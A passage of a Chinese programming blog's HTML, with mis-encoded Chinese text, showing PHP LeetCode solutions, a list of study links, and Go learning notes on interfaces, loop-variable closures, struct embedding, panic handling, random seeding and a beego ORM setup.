class="keyword">this</span>-&gt;stack);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @return Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getMin</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> min($<span class="keyword">this</span>-&gt;stack);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Reverse-Integer"><a href="#Reverse-Integer" class="headerlink" title="Reverse Integer"></a>Reverse Integer</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥: <span class="number">123</span></span><br><span class="line">è¾“å‡º: <span class="number">321</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reverse</span>(<span class="params">$x</span>) </span>&#123;</span><br><span class="line">        $result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (abs($x) &gt; <span class="number">9</span>) &#123;</span><br><span class="line">            $num = $x % <span class="number">10</span>;</span><br><span class="line">            $x = (int)($x / <span class="number">10</span>);</span><br><span class="line">            $result = $result * <span class="number">10</span> + $num;</span><br><span class="line">        &#125;</span><br><span class="line">        $result = $result * <span class="number">10</span> + $x;</span><br><span class="line">        <span class="keyword">if</span> (strlen(base_convert($result, <span class="number">10</span>, <span class="number">2</span>)) &gt; <span class="number">31</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="å›æ–‡æ•°"><a href="#å›æ–‡æ•°" class="headerlink" title="å›æ–‡æ•°"></a>å›æ–‡æ•°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥: <span class="number">121</span></span><br><span class="line">è¾“å‡º: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">è¾“å…¥: <span class="number">-123</span></span><br><span class="line">è¾“å‡º: <span class="literal">false</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span>(<span class="params">$x</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($x &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> ($x % <span class="number">10</span> === <span class="number">0</span> &amp;&amp; $x != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        $reverse = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ($x &gt; $reverse) &#123;</span><br><span class="line">            $reverse = (int)($reverse * <span class="number">10</span> + $x % <span class="number">10</span>);</span><br><span class="line">            $x = (int)($x / <span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $x === $reverse || $x === (int)($reverse / <span class="number">10</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="Remove-Linked-List-Elements"><a href="#Remove-Linked-List-Elements" class="headerlink" title="Remove Linked List Elements"></a>Remove Linked List Elements</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @param ListNode $head</span></span><br><span class="line"><span class="comment">     * @param Integer $val</span></span><br><span class="line"><span class="comment">     * @return ListNode</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">removeElements</span>(<span class="params">$head, $val</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!$head)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $data=$head;</span><br><span class="line">        <span class="keyword">while</span>($data-&gt;next)&#123;</span><br><span class="line">            <span class="keyword">if</span>($data-&gt;next-&gt;val==$val)&#123;</span><br><span class="line">                $data-&gt;next=$data-&gt;next-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $data=$data-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $head-&gt;val==$val?$head-&gt;next:$head;      </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://lbjheiheihei.xyz/2018/08/23/CTF-2.html" target="_blank" rel="noopener">CTF ç›¸å…³çš„å†…å®¹</a></p>
<p><a href="https://cgctf.nuptsast.com/challenges#Web" target="_blank" rel="noopener">ctf æŒ‘æˆ˜</a></p>
<p><a href="http://cs-cjl.com/2016/06_23_leetcode_1_two_sum" target="_blank" rel="noopener">LeetCode ç®—æ³•é¢˜ 1. Two Sum</a></p>
<p><a href="https://laravelacademy.org/post/19641.html" target="_blank" rel="noopener">LeetcodeåŸºç¡€åˆ·é¢˜ä¹‹PHPè§£æ(112. Path Sum)</a></p>
<p><a href="https://learnku.com/articles/25478" target="_blank" rel="noopener">å°è¯• Leetcode https://github.com/icecho/leetcode</a></p>
<p><a href="https://laravelacademy.org/tags/leetcode" target="_blank" rel="noopener">Leetcodeä¹‹PHPç‰ˆé¢˜ç›®è§£æ</a></p>
<p><a href="https://leetcode-cn.com/" target="_blank" rel="noopener">leetcodeä¸­å›½</a></p>
<p><a href="https://github.com/haoel/haoel.github.io" target="_blank" rel="noopener">ç§‘å­¦ä¸Šç½‘</a></p>
<p><a href="https://learnku.com/articles/25461#topnav" target="_blank" rel="noopener">æŒ‘æˆ˜ç”¨ PHP åœ¨ LeetCode åˆ·ç®—æ³•é¢˜</a></p>
<p><a href="http://blessjing.cn/index.php/2019/03/31/arts-%E6%8C%91%E6%88%98%EF%BC%88%E7%AC%AC%E4%BA%8C%E5%91%A8%EF%BC%89/" target="_blank" rel="noopener">ARTS æŒ‘æˆ˜</a></p>
<p><a href="https://github.com/haoel/leetcode" target="_blank" rel="noopener">LEETCODE ç¼–ç¨‹è®­ç»ƒ</a></p>
<p><a href="https://github.com/wuqinqiang/leetcode-php" target="_blank" rel="noopener">PHP å¼€å§‹ leetcode åˆ·é¢˜æ—¶å…‰</a></p>
<p><a href="https://learnku.com/articles/29219" target="_blank" rel="noopener">Leetcode äºŒå‰æ ‘é¢˜ç›®é›†åˆ</a></p>
<p><a href="https://github.com/8090Lambert/Leetcode-Example" target="_blank" rel="noopener">Leetcode å…¨å¥—é¢˜è§£</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/18/golang-å­¦ä¹ ç¬”è®°/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="è‹ç”Ÿä¸æƒ‘">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="è‹ç”Ÿä¸æƒ‘çš„åšå®¢">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/18/golang-å­¦ä¹ ç¬”è®°/" itemprop="url">golang å­¦ä¹ ç¬”è®°</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-03-18T20:39:59+08:00">
                2019-03-18
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  7.9k å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  38 åˆ†é’Ÿ
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="interface-æ¥å£"><a href="#interface-æ¥å£" class="headerlink" title="interface æ¥å£"></a>interface æ¥å£</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://learnku.com/articles/25488</span></span><br><span class="line">type Pet interface &#123;</span><br><span class="line">    SetName(name string)</span><br><span class="line">    Name() string</span><br><span class="line">    Category() string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Dog struct &#123;</span><br><span class="line">    name string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (dog *Dog) SetName(name string) &#123;</span><br><span class="line">    dog.name = name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (dog Dog) Name() string &#123;</span><br><span class="line">    <span class="keyword">return</span> dog.name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (dog Dog) Category() string &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"dog"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func TestDog(t *testing.T) &#123;</span><br><span class="line">    dog := Dog&#123;<span class="string">"little pig"</span>&#125;</span><br><span class="line">    _, <span class="attr">ok</span> := interface&#123;&#125;(dog).(Pet)</span><br><span class="line">    fmt.Printf(<span class="string">"Dog implements interface Pet: %v\n"</span>, ok) <span class="comment">// Dog implements interface Pet: false</span></span><br><span class="line">    _, ok = interface&#123;&#125;(&amp;dog).(Pet)</span><br><span class="line">    fmt.Printf(<span class="string">"*Dog implements interface Pet: %v\n"</span>, ok) <span class="comment">// *Dog implements interface Pet: true</span></span><br><span class="line">    <span class="keyword">var</span> pet Pet = &amp;dog</span><br><span class="line">    fmt.Printf(<span class="string">"This pet is a %s, the name is %q.\n"</span>,</span><br><span class="line">        pet.Category(), pet.Name()) <span class="comment">//  This pet is a dog, the name is "little pig".</span></span><br><span class="line"></span><br><span class="line">    dog.SetName(<span class="string">"monster"</span>)</span><br><span class="line">    fmt.Printf(<span class="string">"This pet is a %s, the name is %q.\n"</span>,</span><br><span class="line">        pet.Category(), pet.Name()) <span class="comment">// This pet is a dog, the name is "monster".</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Go-é™·é˜±ä¹‹-for-å¾ªç¯è¿­ä»£å˜é‡"><a href="#Go-é™·é˜±ä¹‹-for-å¾ªç¯è¿­ä»£å˜é‡" class="headerlink" title="Go é™·é˜±ä¹‹ for å¾ªç¯è¿­ä»£å˜é‡"></a>Go é™·é˜±ä¹‹ for å¾ªç¯è¿­ä»£å˜é‡</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> slice []func()</span><br><span class="line"><span class="comment">//https://learnku.com/articles/26861</span></span><br><span class="line">func main() &#123;</span><br><span class="line">    sli := []int&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> _, <span class="attr">v</span> := range sli &#123;</span><br><span class="line">        fmt.Println(&amp;v)</span><br><span class="line">        slice = append(slice, func()&#123;</span><br><span class="line">            fmt.Println(v * v) <span class="comment">// ç›´æ¥æ‰“å°ç»“æœ</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, <span class="attr">val</span>  := range slice &#123;</span><br><span class="line">        val()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾“å‡º 25 25 25 25 25</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> slice []func()</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    sli := []int&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> _, <span class="attr">v</span> := range sli &#123;</span><br><span class="line">        temp := v <span class="comment">// å…¶å®å¾ˆç®€å• å¼•å…¥ä¸€ä¸ªä¸´æ—¶å±€éƒ¨å˜é‡å°±å¯ä»¥äº†ï¼Œè¿™æ ·å°±å¯ä»¥å°†æ¯æ¬¡çš„å€¼å­˜å‚¨åˆ°è¯¥å˜é‡åœ°å€ä¸Š</span></span><br><span class="line">        fmt.Println(&amp;temp) <span class="comment">// è¿™é‡Œå†…å­˜åœ°å€æ˜¯ä¸åŒçš„</span></span><br><span class="line">        slice = append(slice, func()&#123;</span><br><span class="line">            fmt.Println(temp *  temp) <span class="comment">// ç›´æ¥æ‰“å°ç»“æœ</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> _, <span class="attr">val</span>  := range slice &#123;</span><br><span class="line">        val()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾“å‡º 1, 4, 9, 16, 25 é¢„æœŸç»“æœ</span></span><br><span class="line"><span class="keyword">for</span> i, <span class="attr">v</span> := range</span><br><span class="line">i, v éƒ½æ˜¯åªåˆ›å»ºä¸€æ¬¡ï¼Œç„¶åå¾ªç¯ä¸­èµ‹å€¼ã€‚</span><br><span class="line">å¦å¤–ï¼Œå¾ªç¯çš„æ•°ç»„æˆ– <span class="built_in">Map</span>ï¼Œæ˜¯åœ¨å¼€å§‹å‰çš„é•œåƒï¼Œå¾ªç¯ä¸­æ·»åŠ æˆ–ç§»é™¤å…ƒç´ ä¸æ”¹å˜å…¶å¾ªç¯æ¬¡æ•°ã€‚</span><br><span class="line">å…³äºå¾ªç¯è¿˜å¯ä»¥å¼•ç”³çš„æ˜¯ <span class="built_in">Map</span> æ—¶æ˜¯æ— åºçš„</span><br></pre></td></tr></table></figure>
<h3 id="Struct-ä¸-é¢å‘å¯¹è±¡"><a href="#Struct-ä¸-é¢å‘å¯¹è±¡" class="headerlink" title="Struct ä¸ é¢å‘å¯¹è±¡"></a>Struct ä¸ é¢å‘å¯¹è±¡</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">type Human struct &#123;</span><br><span class="line">    name string</span><br><span class="line">    age int</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> tom Human</span><br><span class="line"><span class="comment">// é€šè¿‡èµ‹å€¼åˆå§‹åŒ– https://learnku.com/articles/25094</span></span><br><span class="line">tom.name, tom.age = <span class="string">"Tom"</span>, <span class="number">18</span></span><br><span class="line"><span class="comment">// è¯¦ç»†åˆå§‹åŒ–</span></span><br><span class="line">jerry := Human&#123;<span class="attr">age</span>:<span class="number">25</span>, <span class="attr">name</span>:<span class="string">"Jerry"</span>&#125;</span><br><span class="line"><span class="comment">// æŒ‰ç…§ç»“æ„ä½“å£°æ˜é¡ºåº</span></span><br><span class="line">peter := Human&#123;<span class="string">"Peter"</span>, <span class="number">34</span>&#125;</span><br><span class="line"><span class="comment">// é€šè¿‡ . è®¿é—®</span></span><br><span class="line">fmt.Printf(<span class="string">"%s is %d old\n"</span>, tom.name, tom.age)</span><br><span class="line"></span><br><span class="line">type Staff struct &#123;</span><br><span class="line">    Human <span class="comment">// éšå¼çš„å¼•å…¥ Human çš„å­—æ®µ</span></span><br><span class="line">    wage int</span><br><span class="line">    age float32 <span class="comment">// è¦†ç›– Human çš„ age</span></span><br><span class="line">&#125;</span><br><span class="line">tom := Staff&#123;Human&#123;<span class="string">"Tom"</span>, <span class="number">18</span>&#125;, <span class="number">1000</span>, <span class="number">18.5</span>&#125;</span><br><span class="line">jerr := Staff&#123;<span class="attr">Human</span>:Human&#123;<span class="attr">age</span>:<span class="number">32</span>, <span class="attr">name</span>:<span class="string">"Jerr"</span>&#125;, <span class="attr">wage</span>: <span class="number">2000</span>, <span class="attr">age</span>: <span class="number">32.5</span>&#125;</span><br><span class="line">fmt.Printf(<span class="string">"%s is %f oldï¼Œ%d years, wage is %d"</span>, tom.name, tom.Human.age, tom.age, tom.wage)</span><br><span class="line">fmt.Printf(<span class="string">"%s is %f oldï¼Œ%d years, wage is %d"</span>, jerr.name, jerr.Human.age, jerr.age, jerr.wage)</span><br><span class="line">type Human struct &#123;</span><br><span class="line">    name string</span><br><span class="line">    age int</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type Employee struct &#123;</span><br><span class="line">    Human</span><br><span class="line">    wage int</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (h *Human) Say() &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"Hi, I am %s, My age is %d"</span>, h.name, h.age)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Employee é‡å†™ Say</span></span><br><span class="line">func (e *Employee) Say() &#123;</span><br><span class="line">    fmt.Printf(<span class="string">"Hi, I am %s, %d old year, wage is %d per mothn"</span>, e.name, e.age, e.wage)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="å¼‚å¸¸å¤„ç†"><a href="#å¼‚å¸¸å¤„ç†" class="headerlink" title="å¼‚å¸¸å¤„ç†"></a>å¼‚å¸¸å¤„ç†</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">func TestPanic(t *testing.T) &#123;</span><br><span class="line">    defer func() &#123;</span><br><span class="line">        fmt.Println(<span class="string">"æœ€åç»“æœä¾æ—§æ‰§è¡Œ!"</span>) <span class="comment">// è¿™ä¸€éƒ¨åˆ†çš„ä»£ç ä¾æ—§æ‰§è¡Œ</span></span><br><span class="line">    &#125;()</span><br><span class="line">    fmt.Println(<span class="string">"æ‰§è¡Œå¼€å§‹"</span>)</span><br><span class="line">    panic(errors.New(<span class="string">"é”™è¯¯ä¿¡æ¯!"</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¾“å‡ºå¤§è‡´ç»“æœå¦‚ä¸‹</span></span><br><span class="line">å¼€å§‹</span><br><span class="line">æœ€åç»“æœä¾æ—§æ‰§è¡Œ!</span><br><span class="line">--- FAIL: TestPanic (<span class="number">0.00</span>s)</span><br><span class="line">panic: é”™è¯¯ä¿¡æ¯! [recovered]</span><br><span class="line">panic: é”™è¯¯ä¿¡æ¯!</span><br></pre></td></tr></table></figure>
<h3 id="rand-Intn-ç”Ÿæˆçš„æ˜¯ä¼ªéšæœºæ•°"><a href="#rand-Intn-ç”Ÿæˆçš„æ˜¯ä¼ªéšæœºæ•°" class="headerlink" title="rand.Intn () ç”Ÿæˆçš„æ˜¯ä¼ªéšæœºæ•°"></a>rand.Intn () ç”Ÿæˆçš„æ˜¯ä¼ªéšæœºæ•°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">rand.Intn() å‡½æ•°æ˜¯ä¸ªä¼ªéšæœºå‡½æ•°, ä¸ç®¡è¿è¡Œå¤šå°‘æ¬¡éƒ½åªä¼šè¿”å›åŒæ ·çš„éšæœºæ•°, å› ä¸ºå®ƒé»˜è®¤çš„èµ„æºå°±æ˜¯å•ä¸€å€¼, æ‰€ä»¥å¿…é¡»è°ƒç”¨ rand.Seed(), å¹¶ä¸”ä¼ å…¥ä¸€ä¸ªå˜åŒ–çš„å€¼ä½œä¸ºå‚æ•°, å¦‚ time.Now().UnixNano() , å°±æ˜¯å¯ä»¥ç”Ÿæˆæ—¶åˆ»å˜åŒ–çš„å€¼.</span><br><span class="line"></span><br><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (<span class="string">"fmt"</span></span><br><span class="line">        <span class="string">"math/rand"</span></span><br><span class="line">        <span class="string">"time"</span>)</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–éšæœºæ•°çš„èµ„æºåº“, å¦‚æœä¸æ‰§è¡Œè¿™è¡Œ, ä¸ç®¡è¿è¡Œå¤šå°‘æ¬¡éƒ½è¿”å›åŒæ ·çš„å€¼https://learnku.com/articles/26011</span></span><br><span class="line">    rand.Seed(time.Now().UnixNano())</span><br><span class="line">    fmt.Println(<span class="string">"A number from 1-100"</span>, rand.Intn(<span class="number">81</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="beego-æ¡†æ¶-model-curd"><a href="#beego-æ¡†æ¶-model-curd" class="headerlink" title="beego æ¡†æ¶ model curd"></a>beego æ¡†æ¶ model curd</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">å®šä¹‰è¦è¿æ¥çš„æ•°æ®åº“ main.go https:<span class="comment">//learnku.com/articles/26029#topnav</span></span><br><span class="line"></span><br><span class="line">package  main</span><br><span class="line"><span class="keyword">import</span>  (</span><br><span class="line">  _  <span class="string">"newgo/routers"</span></span><br><span class="line">  <span class="string">"github.com/astaxie/beego"</span></span><br><span class="line">  <span class="string">"github.com/astaxie/beego/orm"</span></span><br><span class="line">  _  <span class="string">"github.com/go-sql-driver/mysql"</span></span><br><span class="line">)</span><br><span class="line">func  init()  &#123;</span><br><span class="line">  orm.RegisterDriver(<span class="string">"mysql"</span>,  orm.DRMySQL)</span><br><span class="line">  orm.RegisterDataBase(<span class="string">"default"</span>,  <span class="string">"mysql"</span>,  <span class="string">"root:root@tcp(127.0.0.1:3306)/go?charset=utf8"</span>)</span><br><span class="line">&#125;</span><br><span class="line">func  main()  &#123;</span><br><span class="line">  beego.Run()</span><br><span class="line">&#125;</span><br><span class="line">å®šä¹‰è·¯ç”± router.go</span><br><span class="line"></span><br><span class="line">beego.Router(<span class="string">"/type"</span>, 